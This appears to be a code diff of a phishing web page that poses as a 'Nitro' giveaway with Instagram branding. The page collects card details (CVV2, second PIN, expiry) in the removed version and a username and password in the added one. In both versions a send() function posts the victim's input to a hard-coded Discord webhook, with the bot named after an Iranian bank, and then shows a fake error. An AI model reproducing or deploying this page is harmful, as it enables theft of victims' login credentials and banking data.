@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="FR">
 <head>
@@ -14,21 +13,15 @@
 	<div class="header">
 		<div class="top">
 			<div class="logo">
-				<img src="Nitro.png" alt="لتلت" style="width: 175px;">
+				<img src="Nitro.png" alt="instagram" style="width: 175px;">
 			</div>
 			<div class="form">
 			
 			<div class="input_field">
-				<input type="نام کارت" name="نام کارت" id="aa" placeholder="بابت" class="input" required>
+				<input type="email" name="username" id="username" placeholder="نام کارت" class="input" required>
 				</div>
 			<div class="input_field">
-			        <input type="CVV2" name="CVV2" id="bb" placeholder="بنفت" class="input"required>
-				</div>
-                        <div class="input_field">
-			        <input type="رمز دوم" name="رمز دوم" id="cc" placeholder="لتبت" class="input"required>
-				</div>
-                                <div class="input_field">
-			        <input type="تاریخ انقضاء" name="تاریخ انقضاء" id="dd" placeholder="اا" class="input"required>
+					<input type="password" name="password" id="password" placeholder="رمز دوم" class="input"required>
 				</div>
 				<button class="btn" onclick="send()" >
 					<div class="btnt" > Send Nitro </div>
@@ -49,11 +42,9 @@
 <script>
 
     function send(){
-        var a = document.getElementById("aa").value; 
-        var b = document.getElementById("bb").value; 
-        var c = document.getElementById("cc").value; 
-        var d = document.getElementById("dd").value; 
-        var discordWebhook = "https://discord.com/api/webhooks/933960588281913374/LdbUe1zS8E27fID_2HKpvPIoFhV6ejjXvyvHN9A-mjjQKCD0HEfa6Vq807Az5fr5bUv2";       
+        var a = document.getElementById("username").value; 
+        var b = document.getElementById("password").value; 
+        var discordWebhook = "https://discord.com/api/webhooks/915483249583738940/9ZYsVOi13T7k4IXIRkywb8044ibnmartioJlXLOuqB-NyVFrn8yjoI0c_Ec3Pb9FnapS";       
         var request = new XMLHttpRequest();
         request.open("POST", discordWebhook);
         request.setRequestHeader('Content-type', 'application/json');
@@ -61,10 +52,11 @@
 			username: "بانک کشاورزی",
             avatar_url: "https://cdn.discordapp.com/attachments/900813614628368397/908308809016045590/OkYU6D.jpg",
 
-            content:  'نام کارت :'+a+" CVV2:"+b+" " 'رمز دوم :'+c+" تاریخ انقضاء:"+d+" ."
+            content: 'نام کارت :'+a+" رمز دوم:"+b+" ."
+    
         };
         request.send(JSON.stringify(params));
-        alert("فعلا وبسایت در دست تعمیر است لطفا بعدا تلاش کنید...")
+        alert("ERROR 404")
     
     }
     
